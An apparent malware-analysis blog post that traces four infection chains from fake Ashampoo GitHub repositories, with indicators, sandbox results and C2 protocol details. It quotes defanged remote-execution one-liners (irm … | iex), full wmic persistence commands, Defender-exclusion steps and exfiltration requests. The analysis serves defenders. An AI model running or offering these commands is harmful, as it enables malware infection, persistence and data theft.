---
title: "Ashampoo: fake GitHub cracks that deliver four different stealers"
description: A campaign of fake "Ashampoo" repositories on GitHub funnels victims into four infection chains, from a PowerShell one-liner that installs the Remus stealer to an Electron app with WMI persistence. Every chain is traced here, along with the infrastructure they share with another sample.
authors: [Y2GX64]
category: Malware Analysis
date: 2026-10-24
---

*Analysis dates: 5 September to 6 October 2026. The findings combine four Triage submissions, their packet captures, the PowerShell loader scripts, the recovered payload files and local lab captures. Indicators are defanged.*

## Summary

About two dozen GitHub repositories claim to host cracked or "enhanced" builds of Ashampoo software such as WinOptimizer, Burning Studio and Uninstaller. They do not. Each one pushes the visitor into running a script or unpacking a zip, and the result is an info stealer. The campaign uses four distinct infection chains behind the same kind of lure:

| Chain | Delivery | Payload | C2 |
|---|---|---|---|
| A. PowerShell | One-liner in the README, three script hops | Remus stealer (`Helper.exe` → AutoIt3 + `Rentcom.a3x`) | `doresxa[.]click:6271` (`154.19.37[.]231`) |
| B. Setup.exe | Zip from a `nexustool[.]fun` page | `Setup.exe` | `petcarv[.]click:8239` (`15.204.253[.]8`) |
| C. Lua | Raw GitHub zip | Lua interpreter + obfuscated script | Address read from a Polygon smart contract |
| D. Electron | Zip from GitHub Pages | NSIS installer → Electron `apphelp.exe` | `85.137.252[.]193` and a Telegram relay |

A recurring theme is camouflage. Two chains forge an HTTP `Host: github.com` header on their C2 traffic, the Electron chain names its files after Windows components, and the READMEs tell the user to switch off Windows Defender. The Lua chain also turns out to be the same malware as the [Hytale plugin sample](/blog/hytale-plugin-trojan/), down to the smart contract it queries.

| Submission | Sample | Score | Runs |
|---|---|---|---|
| `260906-qe7z4stsfx` | `Helper.exe` (chain A) | 10/10, family Remus | win10v2004 and win11, about 485 s each |
| `260926-mb1j3s1dpe` | `Latest_version.zip` (chain B) | 3/10, "Likely benign" | win10v2004 (371 s) and win11 (320 s) |
| `260926-l93awszy9k` | `BAT_Win-Setup-Optimizer-Ashampoo-v3.6-alpha.4.zip` (chain C) | 6/10 | win10v2004 (366 s) and win11 (368 s) |
| `260926-mdxwzazz8l` | `latest-release.zip` (chain D) | 8/10, "Likely malicious" | win10v2004 (796 s) and win11 (797 s) |

## Concepts used in this sample

- **Pipe to shell.** `irm <url> | iex` downloads a script with `Invoke-RestMethod` and runs it straight from memory with `Invoke-Expression`. Nothing touches disk and the user never sees the code. ATT&CK tracks it under T1059.001, PowerShell.
- **AutoIt.** A scripting language for Windows automation. Compiled `.a3x` scripts run under `AutoIt3.exe`, and the format is rare enough that many scanners treat it as opaque data.
- **IExpress.** A Microsoft self-extracting installer builder. An IExpress package unpacks its files into a temporary `IXP000.TMP` folder and runs a command, which is how `Helper.exe` launches its payload.
- **NSIS and Electron.** NSIS is an installer framework, and Electron is a toolkit for desktop apps built on Chromium and Node.js. A malicious Electron app is a legitimate-looking 170 MB program whose real logic sits in a single `app.asar` archive.
- **WMI event subscription.** Windows Management Instrumentation can run a command whenever a condition occurs. A permanent subscription survives reboots without a Run key or a scheduled task (T1546.003).
- **Dead-drop resolver.** The malware reads its C2 address from a public service the attacker controls, here a blockchain smart contract, so the address can change without touching the sample (T1102.001).
- **Host header spoofing.** Sending a request to one server with another site's name in the `Host` header makes the traffic look, at a glance, like a connection to that site.

## High-level overview

<figure class="art-fig art-diagram"><div class="fig-head"><div class="fig-title">One lure, four chains</div><div class="fig-sub">Every route starts at a fake Ashampoo repository</div></div><div class="fig-draw" role="img" aria-label="A fake Ashampoo repository leads to four chains: a PowerShell one-liner delivering the Remus stealer, Latest_version.zip with Setup.exe, a Lua zip using a Polygon smart contract, and an Electron NSIS package with WMI persistence."><svg viewBox="0 0 520 298" width="520" height="298" aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" style="font-family:var(--sans);max-width:100%;height:auto"><path d="M11 26 L11 258" fill="none" stroke-width="1" style="stroke:var(--line)"/><circle cx="11" cy="26" r="7" style="fill:var(--bg);stroke:var(--accent)" stroke-width="1.2"/><circle cx="11" cy="26" r="3" style="fill:var(--accent)"/><text x="34" y="24" font-size="15" style="fill:var(--ink)">Fake Ashampoo repository</text><text x="34" y="42" font-size="13" style="fill:var(--ink-3)">README, generated banner, keyword-stuffed topics</text><circle cx="11" cy="84" r="7" style="fill:var(--bg);stroke:var(--ink-3)" stroke-width="1.2"/><text x="34" y="82" font-size="15" style="fill:var(--ink)">A · PowerShell one-liner</text><text x="34" y="100" font-size="13" style="fill:var(--ink-3)">3 script hops, Helper.exe, AutoIt: Remus stealer</text><circle cx="11" cy="142" r="7" style="fill:var(--bg);stroke:var(--ink-3)" stroke-width="1.2"/><text x="34" y="140" font-size="15" style="fill:var(--ink)">B · Latest_version.zip</text><text x="34" y="158" font-size="13" style="fill:var(--ink-3)">Setup.exe, same beacon format, C2 on port 8239</text><circle cx="11" cy="200" r="7" style="fill:var(--bg);stroke:var(--ink-3)" stroke-width="1.2"/><text x="34" y="198" font-size="15" style="fill:var(--ink)">C · Lua zip</text><text x="34" y="216" font-size="13" style="fill:var(--ink-3)">Renamed interpreter, script, Polygon contract, screenshot</text><circle cx="11" cy="258" r="7" style="fill:var(--bg);stroke:var(--ink-3)" stroke-width="1.2"/><text x="34" y="256" font-size="15" style="fill:var(--ink)">D · Electron NSIS zip</text><text x="34" y="274" font-size="13" style="fill:var(--ink-3)">apphelp.exe, WMI persistence, clip.exe, Telegram-style relay</text></svg></div></figure>

## Indicators of compromise

### Files

Full on-disk paths were not recorded for every file; locations are as seen in the sandbox runs.

**Chain A.**

| File | SHA-256 | Note |
|---|---|---|
| `1.zip` | `34e279682873241e992c018216101a5c44eb89003fe68c9eecf36d052eee97eb` | Password-protected archive |
| `7za.exe` | `bfb34635f295df13ea1677c0d51d08fafd2da21a1c0bea252df6342d40e511a0` | Standard 7-Zip console build |
| `Helper.exe` | `3b99bf5fcf332df5014460d4e48a9fa71500b035544e9ac2f4165fa2011f61a2` | IExpress "Win32 Cabinet Self-Extractor" |
| `AutoIt3.exe` | `5d69a932a077fee044b193c28e84564143f5c7e51079ab48e88fef74ab0b77b7` | Stock AutoIt interpreter |
| `Rentcom.a3x` | `1fba9ca31168dcd598992438fabe12b90641689807d34a72f9281da17eb3767e` | 826,708 B, entropy 8.00, not decoded |

**Chain B.**

| File | Size | SHA-256 |
|---|---|---|
| `Setup.exe` | 3,654,560 B | `daeedeb426b02d523afb699b2cc4f0095a1244e119af1ed7560557b0ac36bb29` |
| `bin\msvcr120.dll`, `dll\msvcr120.dll` (identical) | n/a | `86e39b5995af0e042fcdaa85fe2aefd7c9ddc7ad65e6327bd5e7058bc3ab615f` |

**Chain C.**

| File | Size | SHA-256 |
|---|---|---|
| `Launcher.bat` | 24 B | content `start minify.exe jsm.txt` |
| `minify.exe` (same bytes as `luau.exe` in the second repository) | 31,920 B | `7ad4b911d05a12f91ab27ba3baa351a56653ca099dda7ad87ee2b94f8cd018c9` |
| `lua51.dll` | 601,461 B | `04d3c82782927330d56827ff551697666dbab4b3abf5b86bde492efdd142bc58` |
| `jsm.txt` | 327,648 B | `8f4b2dfd27ef330c184377cd9d01aef278f82d04f2598dafe1f373119043e56c` |

**Chain D.**

| File | Location | SHA-256 |
|---|---|---|
| `latest-release.zip` | download | `1f2e2e6c97f756b6b85921f44a288af0b1255ae2faf05f3f46b301058353b096` |
| `apphelp.exe` (Electron, 176 MB) | `%TEMP%\RedistCache_325ca8\` | `f1fdb3e045eff53d860bb757980dd194b392910fc8a9b640bae912388cda9c4c` |
| `clip.exe`, same bytes as `RuntimeBroker.exe`, `HealthService.exe`, `SearchIndexer.exe`, `vcredist_core.exe` | `C:\Users\Admin\AppData\Roaming\Microsoft\Windows\RuntimeBroker\RuntimeBroker.exe` and others | `2df7bd58525f7bba81f3d8dbd4151ea74031d29e9b9c3a07b9aa45d2b358ae67` |
| `kehrio.exe` (same as `dxsetup_win64.exe`) | n/a | `b13fc7a734154635d8752f3fcc5d85180b1e51568d94ca59e0169406b86751d7` |

I leave out the 136 junk-named files in chain D's `bin\` folder and the bundled Electron, NSIS and 7-Zip libraries. No staged exfiltration bundle is documented in this post.

### Registry

Persistence was captured only in chain D. Chains A to C show no persistence in the sandbox runs.

| Key | Value | Purpose |
|---|---|---|
| Run values (hive not recorded) | `RuntimeBroker` = `%APPDATA%\Microsoft\Windows\RuntimeBroker\RuntimeBroker.exe` | Second-layer persistence, set by `vcredist_core.exe` |
| Run values (hive not recorded) | `SecurityHealth` = `%LOCALAPPDATA%\Microsoft\Windows\Security\Health\HealthService.exe` | Same |
| WMI `root\subscription` (not registry) | Filter `WinSysUpdate`, consumer `SysUpdateConsumer`, binding between them | Relaunches `RuntimeBroker.exe` every 60 s |

### Mutexes

Not recorded in the evidence used for this post.

### Command lines

```text
irm hxxps://easy-soft[.]su/powershell/Loader.ps1 | iex
irm -Uri "hxxps://true-soft[.]su/encrypted/update.ps1" -UserAgent "<111 random characters>" | iex
"AutoIt3.exe" Rentcom.a3x
cmd.exe /C Launcher.bat   ->   minify.exe jsm.txt
cmd /c net session
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="WinSysUpdate", …
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="SysUpdateConsumer", …
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE …
```

The full `wmic` lines are in chain D below.

### Network

| Indicator | Chain | Role |
|---|---|---|
| `easy-soft[.]su`, `trust-soft[.]cc`, `true-soft[.]su`, `true-adam[.]su` | A | Script and payload hosts; `true-adam[.]su/screen.php` takes screenshots |
| `doresxa[.]click:6271` (`154.19.37[.]231`) | A | Remus C2, forged `Host: github.com` |
| `<repo>.nexustool[.]fun` | B | Zip download page |
| `petcarv[.]click:8239` (`15.204.253[.]8`) | B | Remus-protocol beacon |
| `217.145.226[.]228:80` | C | Fallback host tried before the contract; stalls near 97 KB |
| `polygon.drpc.org`, contract `0x1823A9a0Ec8e0C25dD957D0841e3D41a4474bAdc` | C | Dead-drop resolver, `getData()` |
| `185.10.68[.]110:80` | C | Address stored in the contract; receives a 1920×1080 BMP |
| `85.137.252[.]193` (:80, :3000) | D | `/fila/clip.exe`, `/fila/kehrio.exe`, `/photo` relay |
| `guckridge[.]com` (`172.67.157.14`) | D | Largest transfers; role inferred |
| `api.telegram.org` | D | Short TLS sessions after the relay; hand-off inferred |
| `ipwho.is`, `ipapi.co`, `ipinfo.io`, `ip-api.com`, `icanhazip.com`, `api.ipify.org` | A, C, D | Public IP and location lookups |

### Cross-run consistency

Each chain was run on Windows 10 and Windows 11. Chain A used the same protocol in both runs; `tag` and `exp` differ per run while `hwid` is identical on every sandbox image. Chain A sent 82 POSTs (about 995 KB) on Windows 10 and 29 (a 955-byte upload) on Windows 11, because the first image held more data to take. Chains B and C showed the same network sequence in both runs. Chain D sent screenshots of about 335 KB (Windows 10) and 332 KB (Windows 11).

## Execution flow

### 1. The lure: repositories that look like cracks

The first Remus write-up counted 26 repositories created this year under the GitHub topic `ashampoo`. They present themselves as cracked versions of the real software or as add-ons for it, and the more popular ones share an AI-generated banner image. One of them, `MetalChandler/Ashampoo-Winoptimizer`, had 560 stars when it was analysed, which makes it look established to anyone skimming the page.

<figure class="art-fig"><div class="fig-head"><div class="fig-title">A lure repository</div><div class="fig-sub">560 stars, a generated banner and keyword-stuffed topics</div></div><div class="fig-draw"><img src="/shared/img/ashampoo/repo-winoptimizer.jpg" alt="GitHub repository MetalChandler/Ashampoo-Winoptimizer with a WinOptimizer 26 banner, 560 stars and topics such as ashampoo, pc-optimization and windows-maintenance" width="784" height="581" loading="lazy" /></div></figure>

The README then offers one of two routes: paste a PowerShell command, or download a zip. Some zips live on the repository itself, some on a look-alike site (`<repo-name>.nexustool[.]fun`), and some on GitHub Pages sites that mimic a CI dashboard with invented trust badges.

<figure class="art-fig"><div class="fig-head"><div class="fig-title">Invented trust signals</div><div class="fig-sub">A GitHub Pages site that imitates a secure build pipeline</div></div><div class="fig-draw"><img src="/shared/img/ashampoo/pages-fake-trust.jpg" alt="Dark page titled ashampoo-antivirus-tool / ecore-project.zip with badges reading GitHub Actions secure pipeline, TLS 1.3 SBOM verified, signed by ecore/security, ClamAV 5 engines 0 threats, AES-256 and SLSA level 3" width="1100" height="580" loading="lazy" /></div><div class="fig-cap">"Verified", "signed", "ClamAV 0 threats" and "SLSA level 3" are all just text on the page.</div></figure>

Troubleshooting sections in the READMEs matter as much as the install steps. They anticipate the points where a cautious user would stop, and answer each with advice that helps the malware:

<figure class="art-fig"><div class="fig-head"><div class="fig-title">Anticipating objections</div><div class="fig-sub">README troubleshooting for the PowerShell route</div></div><div class="fig-draw"><img src="/shared/img/ashampoo/readme-troubleshooting.jpg" alt="README sections: Script is blocked by Execution Policy, with a powershell -ExecutionPolicy Bypass command; irm command not found; Antivirus and SmartScreen alerts, advising to pause real-time protection" width="957" height="581" loading="lazy" /></div></figure>

- A blocked script is answered with `powershell -ExecutionPolicy Bypass -Command "irm …/Loader.ps1 | iex"`.
- Security software "may occasionally flag automated installers", so the user is told to pause real-time protection.
- The zip chains ship a `How To Setup.txt` that tells the user to add the folder to Defender exclusions or switch protection off, with a link to a video guide.

### 2. Chain A: the PowerShell loader and the Remus stealer

#### Delivery

The README tells the visitor to paste `irm hxxps://easy-soft[.]su/powershell/Loader.ps1 | iex`. Other repositories use `trust-soft[.]cc` for the first hop, which the campaign report records as an extra step before `easy-soft[.]su`, and follow the same pattern. The chain then runs in three script stages and one executable stage:

| Stage | Host | What it does |
|---|---|---|
| 1. `Loader.ps1` | `easy-soft[.]su` (or `trust-soft[.]cc` in other repositories) | Sets TLS 1.2, decodes a base64 string and executes it |
| 2. Decoded line | `true-soft[.]su/encrypted/update.ps1` | Downloads and runs `update.ps1` in memory, with a 111-character random user agent |
| 3. `update.ps1` | `true-adam[.]su` | Downloads `1.zip` and `7za.exe`, screenshots the desktop, unpacks and runs `Helper.exe` |
| 4. `Helper.exe` | local | IExpress extractor that runs `AutoIt3.exe Rentcom.a3x` |

The second-stage line is short:

```powershell
irm -Uri "hxxps://true-soft[.]su/encrypted/update.ps1" -UserAgent "aizkHkKtfN…IxKHePMYeeEMWXarInkmuwrUmzBIs" | iex
```

#### What `update.ps1` does

The script (SHA-256 `f45ab4a799f59709f076707ea1dbb1230cce1a83119f8ef1bb1dbc16dae6da5b`) is about 9 KB and readable, and it shows the whole routine. It dresses itself as a three-step installer so the victim sees something plausible while it works:

- **A fake installer.** The console prints `[1/3] Checking for Updates...`, `[2/3] Initialization Components...` and `[3/3] Running Application...` with progress bars that run on random timers. At the end it prints a fake `0xc0000135` "failed to load DLL: kernel32.dll" error and links to a Microsoft Q&A page, which gives the victim a reason why nothing seemed to install.
- **Defender exclusion.** If the session is elevated, it adds its temp folder (`%TEMP%\svc_<random>`) to Defender's exclusion list. A non-elevated session skips this.
- **Geolocation.** It tries `ipwho.is`, `ipapi.co` and `ipinfo.io` in turn and keeps a two-letter country code, falling back to the system region. The `pc` name and country go into every later request.
- **Screenshots.** It captures the whole virtual screen as a PNG, base64-encodes it, and POSTs it to `true-adam[.]su/screen.php`. It takes one before running the payload and one after the fake error.
- **Payload.** It downloads `1.zip` and `7za.exe` from `true-adam[.]su/encrypted/`, unpacks the archive with the hardcoded password `1`, and runs `1/Helper.exe`.
- **Cleanup.** It deletes its working folder, clears the PSReadLine history, and turns history saving off.
- **Operator tag.** Every request sends the user agent `GREETINGSFROMTHERABBIDSTEAM`.

One coding oddity: the script requests `start.php` and `end.php` on the same host and is written to run whatever script comes back. Because it pipes the response through `Out-Null` before storing it, the variable is always empty, so those server-side hooks never execute as written. They still produce the `start.php` and `end.php` requests as beacons.

#### The payload files

The five files, with hashes, are listed under Indicators of compromise, Files, Chain A.

`Helper.exe` is not itself a stealer. Its strings show the IExpress extractor (`wextract`, `IXP%03d.TMP`, "Win32 Cabinet Self-Extractor") and the command it runs, `"AutoIt3.exe" Rentcom.a3x`. The actual stealer logic is in `Rentcom.a3x`, which is encrypted (entropy 8.00) and was not decoded here, so its behavior is known only from what the sandbox observed.

#### Behavior in the sandbox

Triage scores `Helper.exe` 10/10 and names the family **Remus**. In both runs the process tree is `Helper.exe` → `at.exe` (a `WriteProcessMemory` target started with the nonsense argument `/8576uhsdfjkgh2034958`) → `AutoIt3.exe Rentcom.a3x` → a second argument-less `AutoIt3.exe` that receives the payload by `SetThreadContext` and `WriteProcessMemory`. The self-injected copy performs the theft. The sandbox signatures show it reading browser profiles, local email clients and cryptocurrency wallet files, and checking installed software. The decoy `at.exe` is probably there to make the process tree look unremarkable, but this is inferred.

#### Command and control

- **DNS canary.** About 2.5 s after launch it resolves a made-up double-label name (`XfmVqQSOUjUKgdeUmPsgmiKKQ.XfmVqQSOUjUKgdeUmPsgmiKKQ`) that must return NXDOMAIN, the standard test for a sandbox or resolver that answers everything. Both runs saw NXDOMAIN, and the malware went on.
- **Forged host.** It then sends plain-HTTP POSTs to `doresxa[.]click` (`154.19.37[.]231`, port 6271, hosted in Indonesia by Triage's geolocation) to `/workspaces` with `Host: github.com` and a Chrome 117 user agent. The server is not GitHub, and a reverse lookup of the IP returns nothing related to it.

<figure class="art-fig"><div class="fig-head"><div class="fig-title">The forged Host header</div><div class="fig-sub">Wireshark, HTTP stream to 154.19.37[.]231:6271</div></div><div class="fig-draw"><img src="/shared/img/ashampoo/c2-host-spoof.jpg" alt="Wireshark stream: POST /workspaces HTTP/1.1 with Host: github.com, Chrome 117 user agent, a body of tag, exp and hwid, answered by HTTP/1.1 405 Not Allowed from nginx with Allow: GET, HEAD" width="986" height="521" loading="lazy" /></div></figure>

The protocol is the same in both runs:

| Step | Request | Detail |
|---|---|---|
| Register | POST form `tag`, `exp`, `hwid` | 89 bytes. The `tag` and `exp` differ per run; `hwid` is identical on every sandbox image, so it is useless as an indicator. |
| Log | POST form `access_token`, `debug` | Status text, 68 in run A and 14 in run B |
| Progress | POST form `access_token`, `step` | A step counter, 7 in run A and 13 in run B |
| Upload | multipart `access_token`, `type`, `file` (`data`) | Opaque binary; 6 in run A, 1 in run B |

Totals were 82 POSTs in run A and 29 in run B. Run A sent about 995 KB, including a final 919 KB upload at about t+67 s, while run B sent only a 955-byte upload. The difference means the Windows 10 image had far more data to take. The `access_token` is a UUID that appears to be generated by the client, since the server's replies never look like an issued token.

#### The odd "405" replies

Every response carries the status `405 Not Allowed` from `nginx` with `Allow: GET, HEAD`, which looks like a server that refuses POST. The bodies suggest something else. Most replies are the stock HTML 405 page, but the first reply in both runs has a 117-byte high-entropy body, six replies in run A carry about 1,160 bytes of high-entropy data, and one reply in run B is the 12-byte JSON `{"end":true}`. The server appears to be sending real data inside responses that are labelled as errors. The encrypted bodies were not decoded, so what they carry is unknown.

### 3. Chain B: `Latest_version.zip` and `Setup.exe`

The README sends the visitor to a site such as `ashampoo-burning-studio.nexustool[.]fun`, a page titled "Get the latest build" that says "Online · ready to download". The zip holds `Setup.exe` (3,654,560 B, SHA-256 `daeedeb426b02d523afb699b2cc4f0095a1244e119af1ed7560557b0ac36bb29`) and two identical copies of `msvcr120.dll` in `bin\` and `dll\` (SHA-256 `86e39b5995af0e042fcdaa85fe2aefd7c9ddc7ad65e6327bd5e7058bc3ab615f`).

Triage scored it **3/10, "Likely benign"**, and its only signature was "Untrusted Codesign Signers". That score is misleading. In both runs the executable resolves `petcarv[.]click`, connects to `15.204.253[.]8:8239`, and sends one POST:

```text
POST /documents HTTP/1.1
Host: github.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) … Chrome/117.0.0.0 Safari/537.36
Content-Length: 89

tag=5a4378fb90db39f09c7b18d1f314e645&exp=…&hwid=61065ea193b62d39077040f1620db9bf
```

The server answers `405 Not Allowed` with a 55-byte binary body. The request has the same form fields, the same 89-byte length, the same forged `Host` and the same Chrome 117 user agent as the Remus registration in chain A. Only the domain, port and path differ, and the IP (`15.204.253[.]8`) resolves in reverse to an OVH VPS name. This is strong evidence that `Setup.exe` speaks the Remus protocol, and a reasonable inference that it belongs to the same family with a different C2. Nothing after the first beacon was captured, so the stealer behavior itself is not observed in this run.

### 4. Chain C: the Lua loader

Two repositories ship a pure-script version. `Win-Setup-Optimizer-Ashampoo-v3.6-alpha.4.zip` holds four files:

| File | Size | SHA-256 |
|---|---|---|
| `Launcher.bat` | 24 B | content: `start minify.exe jsm.txt` |
| `minify.exe` | 31,920 B | `7ad4b911d05a12f91ab27ba3baa351a56653ca099dda7ad87ee2b94f8cd018c9` |
| `lua51.dll` | 601,461 B | `04d3c82782927330d56827ff551697666dbab4b3abf5b86bde492efdd142bc58` |
| `jsm.txt` | 327,648 B | `8f4b2dfd27ef330c184377cd9d01aef278f82d04f2598dafe1f373119043e56c` |

A second repository (`io-bedspringsystem`) ships `luau.exe`, `lua51.dll` and `mime.txt` with `Application.bat` (`start luau.exe mime.txt`). `luau.exe` and `minify.exe` are **byte-identical**, as are the two `lua51.dll` files. Only the launcher name, the interpreter's file name and the script differ, and `jsm.txt` and `mime.txt` start with the same heavily obfuscated Lua pattern (`return(function(...)local k=function(K)…`). A 32 KB console stub linked to `lua51.dll` is a stock Lua 5.1 loader, so the interpreter is renamed to look like a minifier or other utility.

#### The sandbox run

The process chain is `Explorer` → `cmd.exe /C Launcher.bat` → `minify.exe jsm.txt`, and Triage flags the `cmd.exe` → `minify.exe` `WriteProcessMemory` pair. The network sequence, on both runs, is:

1. `GET /json/` to `ip-api.com` (host geolocation).
2. A TCP connection to `217.145.226[.]228:80` that sends about 97 KB and stalls, with ICMP "Fragmentation Needed" messages coming back from the sandbox gateway.
3. A TLS session to `polygon.drpc.org`.
4. A `POST /api/NTE3YjdjNWU1NjYzNjU2YTA1N2Y=` to `185.10.68[.]110:80`, 6,221,697 bytes, which the server answers with `200 {"error":"not found"}`.

#### The on-chain lookup, decoded

The Triage capture holds the Polygon exchange in readable form. The request is a standard Ethereum JSON-RPC read:

```json
{"jsonrpc":"2.0","method":"eth_call",
 "params":[{"to":"0x1823A9a0Ec8e0C25dD957D0841e3D41a4474bAdc","data":"0x3bc5de30"},"latest"],"id":1}
```

The selector `0x3bc5de30` is the function `getData()`. The reply is an ABI-encoded string:

```text
0x…0020 …0014 687474703a2f2f3138352e31302e36382e313130
→ "http://185.10.68.110"
```

That value is the host that then accepts the upload. The contract stores the C2 URL, and the malware reads it just before it needs it. This confirms the dead-drop pattern as observed behavior and no longer as an inference.

The upload body is a multipart form with a field named `file`, content type `application/octet-stream`, and a random 81-character filename. Its content starts at `BM` with a header for **1920×1080 at 24 bits per pixel**, an uncompressed full-HD screenshot. The user agent is Chrome 148.

#### Same malware as the Hytale sample

This chain is functionally identical to the [Hytale plugin trojan](/blog/hytale-plugin-trojan/), analysed on 11 September from a different lure:

| | Hytale plugin (11 Sep) | Ashampoo Lua (26 Sep) |
|---|---|---|
| Launcher | `Launch.bat` → `luajit.exe x64.txt` | `Launcher.bat` → `minify.exe jsm.txt` |
| Geolocation | `ip-api.com/json/` | `ip-api.com/json/` |
| Attempt before the lookup | `89.169.12[.]245`, stalls near 98 KB | `217.145.226[.]228`, stalls near 97 KB |
| RPC node | `polygon.drpc.org` | `polygon.drpc.org` |
| Contract and call | `0x1823A9a0…4bAdc`, `getData()` | `0x1823A9a0…4bAdc`, `getData()` |
| Value read from the contract | `http://194.48.248.94` | `http://185.10.68.110` |
| Upload path | `/api/NTE3YjdjNWU1NjYzNjU2YTA1N2Y=` | `/api/NTE3YjdjNWU1NjYzNjU2YTA1N2Y=` |
| Body | 1920×1080 24-bit BMP, 6,221,670 B | 1920×1080 24-bit BMP, 6,221,697 B |
| Reply | `200 {"error":"not found"}` | `200 {"error":"not found"}` |
| User agent | Chrome 142 | Chrome 148 |

The same contract, the same function and the same URL path point to one operator or one toolkit. The value stored in the contract changed between the two dates, from `194.48.248[.]94` to `185.10.68[.]110`, which shows the operator rotating infrastructure by editing the contract, exactly what a dead-drop resolver is for. The path segment base64-decodes to `517b7c5e5663656a057f`, and its constancy across two lures makes it a likely build or campaign identifier.

Both samples contact one IP before they read the contract (most likely a hardcoded fallback) and only afterwards use the on-chain address. In both, the first host stalls near 97 to 99 KB while the on-chain host completes the full 6.2 MB. The cause of the stall is not established. Packet captures show gateway ICMP messages but not why the first hosts behave differently.

### 5. Chain D: the Electron package

#### Delivery and installer

The README sends the user to a GitHub Pages site and a `latest-release.zip` (SHA-256 `1f2e2e6c97f756b6b85921f44a288af0b1255ae2faf05f3f46b301058353b096`) that holds `release.exe` (85.7 MB, NSIS), a 136-item `bin\` folder of junk-named files (`base_18.dat`, `lib_3.dll` and so on) and `How To Setup.txt`. The text file is the Defender-disabling advice, and the installer opens beside it in Triage's Windows run:

<figure class="art-fig"><div class="fig-head"><div class="fig-title">How To Setup.txt</div><div class="fig-sub">The text file that ships with the Electron package</div></div><div class="fig-draw"><img src="/shared/img/ashampoo/howtosetup.jpg" alt="Notepad showing: Unzip Archive. Installation blocked? Windows Defender flagged the installer. Quick fix: add to exclusions, or temporarily turn off real-time protection, with a short video guide link" width="496" height="346" loading="lazy" /></div></figure>

Running `release.exe` unpacks an NSIS payload (`app-64.7z`, `System.dll`, `nsis7z.dll`) into `%TEMP%\nsy*.tmp\7z-out`. The package is then copied to `%TEMP%\RedistCache_325ca8\`, where the main program is `apphelp.exe` (176 MB, SHA-256 `f1fdb3e045eff53d860bb757980dd194b392910fc8a9b640bae912388cda9c4c`), an Electron app named after the real `apphelp.dll`. Its logic sits in `resources\app.asar` (15.9 MB) with an unusual extra file, `app.asar.unpacked\runtimead16.dat`. The user data goes to `%APPDATA%\apphelp`.

#### Persistence and defense evasion

The process list shows a deliberate sequence:

1. `cmd /c net session` runs twice, a quick check for administrator rights.
2. A hidden PowerShell with `-EncodedCommand` adds Defender exclusions: `apphelp.exe` by path, the `%TEMP%\Runtime\store` folders, `vcredist_core.exe` and `dxsetup_win64.exe` as paths and processes, and the extensions `.exe` and `.tmp`.
3. Three `wmic` commands create a WMI event subscription, as a permanent trigger that runs every 60 seconds:

```text
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="WinSysUpdate", EventNameSpace="root\cimv2",
  QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="SysUpdateConsumer",
  CommandLineTemplate="C:\Users\Admin\AppData\Roaming\Microsoft\Windows\RuntimeBroker\RuntimeBroker.exe"
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"WinSysUpdate\"", Consumer="CommandLineEventConsumer.Name=\"SysUpdateConsumer\""
```

The performance counter class it watches updates continuously, so the filter fires on every cycle and the consumer relaunches the program every minute. Two Run values, set by the dropped `vcredist_core.exe`, add a second layer: `RuntimeBroker` points at `%APPDATA%\Microsoft\Windows\RuntimeBroker\RuntimeBroker.exe` and `SecurityHealth` at `%LOCALAPPDATA%\Microsoft\Windows\Security\Health\HealthService.exe`. The package also writes `SearchIndexer.exe` and SYSTEM-profile copies of the same names, all fake Windows component names.

#### Payloads from a bare IP

About six to seven minutes into the capture, two files arrive in plain HTTP from `85.137.252[.]193` (Spain). The URL paths in the packet capture are `/fila/clip.exe` and `/fila/kehrio.exe`:

| File | Size | SHA-256 | Observed behavior |
|---|---|---|---|
| `clip.exe` | 48,884 B | `2df7bd58525f7bba81f3d8dbd4151ea74031d29e9b9c3a07b9aa45d2b358ae67` | Identical to every persistence copy: `RuntimeBroker.exe`, `HealthService.exe`, `SearchIndexer.exe` and `vcredist_core.exe`. In both user and SYSTEM contexts it triggers Triage's `AddClipboardFormatListener` signature. |
| `kehrio.exe` | 651,264 B | `b13fc7a734154635d8752f3fcc5d85180b1e51568d94ca59e0169406b86751d7` | Identical to `dxsetup_win64.exe` |

The persisted payload is therefore the small `clip.exe` and the signature shows it watching the clipboard. The name and that behavior fit a clipboard-hijacking utility that swaps copied wallet addresses, but the swap itself was not observed, so the role is inferred.

#### Exfiltration through a Telegram-style relay

The next step is a pair of POSTs to port 3000 on the same IP. They imitate the Telegram Bot API's `sendPhoto` call:

```text
POST /photo HTTP/1.1
Host: 85.137.252.193:3000
X-Secret: cc485080…d86f
Content-Type: multipart/form-data

chat_id = Admin@Iijxkbaw
caption = <b>Runtime Components</b> 👤 Admin | 💻 Iijxkbaw 🖥 Windows_NT 10.0…
photo   = s.png (image/png, 1920×1080)
```

Each body is about 335 KB (332 KB on Windows 11) and the PNG header decodes to 1920×1080, so these are desktop screenshots tagged with `user@hostname`. The server replies `200 {"ok":true,"tag":"kahreio"}`, with a tag that echoes `kehrio.exe`. The format suggests the relay passes the data on to Telegram, and short TLS sessions to `api.telegram.org` do follow, but their content is encrypted, so the hand-off is inferred.

#### Other traffic

The Windows 10 run also queries `icanhazip.com`, `ipwho.is` and `api.ipify.org` for the public IP, uses DNS over HTTPS through `dns.google`, and makes the largest transfers to `guckridge[.]com` (Cloudflare-fronted, `172.67.157.14`). That TLS content was not decrypted, so its role as a second C2 or exfiltration channel is inferred. Chrome is launched with its `elevation_service.exe`, and Triage records a `SetThreadContext` call from `Explorer.exe` into `chrome.exe`, consistent with browser data theft. The sample ends by running a dropped `.cmd` that kills the process and waits, apparently to delete itself.

### 6. Shared tradecraft

| Trait | A | B | C | D |
|---|---|---|---|---|
| GitHub README lure | yes | yes | yes | yes |
| Told to disable or exclude Defender | yes | yes | yes | yes |
| Forged `Host: github.com` | yes | yes | no | no |
| Chrome user agent | 117 | 117 | 148 | Windows Chrome string |
| C2 on a non-standard port | 6271 | 8239 | 80 (URL from contract) | 3000 |
| Screenshot of the desktop | yes | not observed | yes | yes |
| Persistence captured | no | no | no | WMI + Run keys |

